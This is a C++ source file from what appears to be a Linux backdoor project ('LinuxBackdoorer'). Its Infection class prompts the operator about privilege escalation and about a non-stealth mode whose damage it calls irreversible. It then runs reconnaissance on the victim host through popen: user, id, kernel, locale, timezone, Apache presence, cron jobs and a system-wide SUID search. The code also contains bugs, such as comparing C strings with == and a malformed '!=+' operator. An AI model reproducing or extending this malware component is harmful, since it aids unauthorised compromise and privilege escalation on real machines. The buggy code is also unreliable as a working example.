#include "Infection.h"

FileInformations Infection::GetFileInformations(const char* fileName){
	struct stat fileMetaInformations;
	FileInformations infos;
	printf("[+] File Informations : %s\n", fileName);
	if(stat(fileName, &fileMetaInformations) < 0){
		return infos;
	}
	//File Name
	infos.fileName = fileName;
	//printf("FileName = %s\n", fileName);
	//File Permissions
	infos.filePermissions[0] = ((S_ISDIR(fileMetaInformations.st_mode) ? 'd' : '-'));
	infos.filePermissions[1] = ((fileMetaInformations.st_mode & S_IRUSR) ? 'r' : '-');
	infos.filePermissions[2] = ((fileMetaInformations.st_mode & S_IWUSR) ? 'w' : '-');
	infos.filePermissions[3] = ((fileMetaInformations.st_mode & S_IXUSR) ? 'x' : '-');
	infos.filePermissions[4] = ((fileMetaInformations.st_mode & S_IRGRP) ? 'r' : '-');
	infos.filePermissions[5] = ((fileMetaInformations.st_mode & S_IWGRP) ? 'w' : '-');
	infos.filePermissions[6] = ((fileMetaInformations.st_mode & S_IXGRP) ? 'x' : '-');
	infos.filePermissions[7] = ((fileMetaInformations.st_mode & S_IROTH) ? 'r' : '-');
	infos.filePermissions[8] = ((fileMetaInformations.st_mode & S_IWOTH) ? 'w' : '-');
	infos.filePermissions[9] = ((fileMetaInformations.st_mode & S_IXOTH) ? 'x' : '-');
	infos.filePermissions[10] = ' ';
	//File Other Informations
	infos.fileSize = fileMetaInformations.st_size;
	infos.fileLinks = fileMetaInformations.st_nlink;
	infos.fileiNode = fileMetaInformations.st_ino;
	//Print Fields
	//printf("%d\n%d\n%d\n", infos.fileSize, infos.fileLinks, infos.fileiNode);
	return infos;	
}
void Infection::askForPrivilegeEscalation(){
	std::string answer2PE = {""};
	while(true){
		printf("[+] Would you like to try to escalate your privileges?\n");
		printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
		std::cin >> answer2PE;
		if(answer2PE == "YES" || answer2PE == "NO" || answer2PE == "Y" || answer2PE == "N" || answer2PE == "yes" || answer2PE == "no" || answer2PE == "y" || answer2PE == "n"){
			if(answer2PE == "YES" || answer2PE == "yes" || answer2PE == "y" || answer2PE == "Y"){
				printf("[+] Attempting to find Privilege Escalation Vectors and Potentially Exploit it !\n");
				tryPrivilegeEscalation = true;
				break;
			} else if(answer2PE == "NO" || answer2PE == "no" || answer2PE == "n" || answer2PE == "N"){
				printf("[+] Skipping the search for Privilation Escalation Vectors !\n");
				tryPrivilegeEscalation  = false;
				break;
			}
		} else {
			printf("[-] Please enter a valid value !\n");
			system("sleep 2.5");
			system("clear");
		}
	}	
}

bool Infection::askForNoStealthMode(){
	std::string answer2StealthMode{""};
	while(true){
		printf("[+] Would you like to disable Stealth Mode and really F#!$ your target system ?\n");
		printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
		std::cin >> answer2StealthMode;
		if(answer2StealthMode == "YES" || answer2StealthMode == "NO" || answer2StealthMode == "Y" || answer2StealthMode == "N" || answer2StealthMode == "yes" || answer2StealthMode == "no" || answer2StealthMode == "y" || answer2StealthMode == "n"){
			if(answer2StealthMode == "YES" || answer2StealthMode == "yes" || answer2StealthMode == "y" || answer2StealthMode == "Y"){
				std::string confirm{""};
				system("clear");
				printf("Are you sure you want to continue ? (The damage caused by the malware are not reversable) : \n");
				printf("Please use the following format for your answer (y/Y/yes/YES | n/N/no/NO) : ");
				std::cin >> confirm;
				if(confirm == "YES" || confirm == "yes" || confirm == "y" || confirm == "Y"){
					system("clear");
					printf("[+] Stealth Mode Disabled, the user will clearly notice that something happens to his system but i will try to obfuscate our presence the most as possible !\n");
					return stealthEnabled = false;
				} else if(confirm == "NO" || confirm == "no" || confirm == "n" || confirm == "N") {
					system("clear");
					printf("[+] Stealth Mode Enabled, *shhhhhh*\n");
					return stealthEnabled = true;
				}		
			} else if(answer2StealthMode == "NO" || answer2StealthMode == "no" || answer2StealthMode == "n" || answer2StealthMode == "N"){
				system("clear");
				printf("[+] Stealth Mode Enabled, *shhhhhh*\n");
				return stealthEnabled = true;
			}		
		}
	}
}

void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE){
	char buffer[2055];
	FILE *command = popen(commandToRun, "r");
	if(command == NULL){
		printf("%s", errorMESSAGE);
	}
	//Print the command
	while(fgets(buffer, sizeof(buffer), command) != NULL){
		printf("%s\n", buffer);
	}
}

void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE, const char* successMessage){
	char buffer[2055];
	FILE *command = popen(commandToRun, "r");
	if(command == NULL){
		printf("%s", errorMESSAGE);
	}
	//Print the command
	while(fgets(buffer, sizeof(buffer), command) != NULL){
		printf("%s %s", successMessage,buffer);
	}
}

void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSAGE, const char* successMessage, const char* vOutput){
	char buffer[2055];
	FILE *command = popen(commandToRun, "r");
	if(command == NULL){
		printf("%s", errorMESSAGE);
		log2File("logs.txt", errorMESSAGE);
	}

	//Print the command
	while(fgets(buffer, sizeof(buffer), command) != NULL){
		if(vOutput == "KernelRelease"){
			if(buffer != ""){
				KernelRelease = buffer;
				printf("%s %s", successMessage, buffer);
				log2File("logs.txt", successMessage + ' ' + *buffer);
			}
		} else if(vOutput == "KernelVersion"){
			if(buffer != ""){
				KernelVersion = buffer;
				printf("%s %s", successMessage, buffer);
				log2File("logs.txt", successMessage + ' ' + *buffer);
			}
		} else if(vOutput == "suidFiles") {
			if(buffer != ""){
				printf("\t- %s", buffer);
				//TODO : Log2File
			}
		} else if(vOutput == "whoami"){
			if(buffer !=+ ""){
				user = buffer;
				printf("%s %s", successMessage, buffer);
				log2File("logs.txt", successMessage + ' ' + *buffer);
			}
		}else if(vOutput == "findApache"){
			if(buffer != ""){
				printf("[+] Found Package : %s", buffer);
				log2File("logs.txt", "[+] Found Package : " + *buffer);
				isApache2Present = true;
			} else {
				printf("[-] Apache not found on the system !");
				log2File("logs.txt", "[-] Apache not found on the system");
				isApache2Present = false;
			}
		} else if(vOutput == "localeLanguage"){
			localLanguage = buffer;
			printf("%s %s", successMessage, buffer);
			log2File("logs.txt", successMessage + ' ' + *buffer);
		} else if(vOutput == "timezone"){
			localTimeZone = buffer;
			printf("%s %s", successMessage, buffer);
			log2File("logs.txt", successMessage + ' ' + *buffer);
		} else {
			printf("%s %s", successMessage, buffer);
			log2File("logs.txt", successMessage + ' ' + *buffer);
		}
	}
}

void Infection::GetLinuxVersion(){
	//Get the version of the linux target
	//Current User
	const char* currentUserErrorMessage = "\033[1;31m[-] Failed to obtain the current user name\033[0m";
	const char* currentUserSuccessMessage = "\033[1;32m[+] Current User :\033[0m";
	runLocalCommand("whoami", currentUserErrorMessage, currentUserSuccessMessage, "whoami");
	//User and group informations
	const char* currentUserGroupErrorMessage = "\033[1;31m[-] Failed to obtain the user and group information\033[0m";
	const char* currentUserGroupSuccessMessage = "\033[1;32m[+] User and Group Informations :\033[0m";
	runLocalCommand("id", currentUserGroupErrorMessage, currentUserGroupSuccessMessage, "id");
	//Kernel Release
	const char* kernelReleaseErrorMessage = "\033[1;31m[-] Failed to obtain Kernel Release\033[0m";
	const char* kernelReleaseSuccessMessage = "\033[1;32m[+] Kernel Release :\033[0m";
	runLocalCommand("uname -r", kernelReleaseErrorMessage, kernelReleaseSuccessMessage, "KernelRelease");
	//Locale Language on the system
	const char* localLangErrorMessage = "\033[1;31m[+] Can't retrieve System Local Language\033[0m";
	const char* localLangSuccessMessage = "\033[1;32m[+] System Local Language :\033[0m";
	runLocalCommand("localectl | grep System | cut -d ' ' -f6 | cut -d '=' -f2", localLangErrorMessage, localLangSuccessMessage, "localeLanguage");
	const char* timeZoneErrorMessage = "\033[1;31m[+] Can't retrieve Timezone\033[0m";
	const char* timeZoneSuccessMessage = "\033[1;32m[+] Timezone :\033[0m";
	runLocalCommand("cat /etc/timezone", timeZoneErrorMessage, timeZoneSuccessMessage, "timezone");
	//KernelVersion [Kind of useless right now]
	//const char* kernelFullErrorMessage = "[-] Failed to obtain Kernel Version";
	//const char* kernelFullSuccessMessage = "[+] Kernel Version :";
	//runLocalCommand("uname -v", kernelFullErrorMessage, kernelFullSuccessMessage, "KernelVersion");
	//Distribution Release Number
	const char* distributionReleaseNumberErrorMessage = "\033[1;31m[-] Failed to obtain Kernel Distribution Number\033[0m";
	const char* distributionReleaseNumberSuccessMessage = "\033[1;32m[+] Kernel Release Number :\033[0m";
	runLocalCommand("lsb_release -r -s", distributionReleaseNumberErrorMessage, distributionReleaseNumberSuccessMessage, "KernelVersion");
	//APACHE2 Detection
	const char* apacheDetectionErrorMessage = "\033[1;31m[-] Couldn't search apache2\033[0m";
	const char* apacheDetectionSuccessMessage = "\033[1;32m[+] Apache2 Found on the victim system !\033[0m";
	runLocalCommand("dpkg --get-selections | grep apache2 | cut -d '	' -f1", apacheDetectionErrorMessage, apacheDetectionSuccessMessage, "findApache");
	//Cron jobs
	printf("[+] Cron Jobs :\n");
	const char* cronJobsErrorMessage = "\033[1;31m[-] Failed to obtain the Cron Jobs\033[0m";
	const char* cronJobsSuccessMessage = "\033[1;32m[+] Cron Jobs successfully retrieved !\033[0m";
	runLocalCommand("crontab -l", cronJobsErrorMessage, cronJobsSuccessMessage);
	//SUID Files
	const char* suidFilesErrorMessage = "\033[1;31m[-] Failed to obtain SUID Files\033[0m";
	const char* suidFilesSuccessMessage = "\033[1;32m[+] SUID Files :\033[0m";
	if(tryPrivilegeEscalation){
		printf("\033[1;32m[+] SUID Files :\033[0m\n");
		runLocalCommand("find / -type f -perm -u=s 2>/dev/null", suidFilesErrorMessage, suidFilesSuccessMessage, "suidFiles");
	}
}

bool Infection::startInfection(){
	FileInformations passwd;
	passwd = Infection::GetFileInformations("LinuxBackdoorer");
	//LOG
	if(std::experimental::filesystem::exists("logs.txt")){
		Infection::log2File("logs.txt", *user + " added content to log file.");
	} else {
		Infection::log2File("logs.txt", *user + " created log file.");
	}
	//Writing test
	//Infection::write2File("TEST.txt", "I am making tests BOW !");
	//Ask for no stealth mode
	Infection::askForNoStealthMode();
	//Ask for privileges
	Infection::askForPrivilegeEscalation();
  	//GetLinuxVersioni9u
	Infection::GetLinuxVersion();
	//Enumerate adapters;
	Networking::enumerateAdapters();
	return true;
}
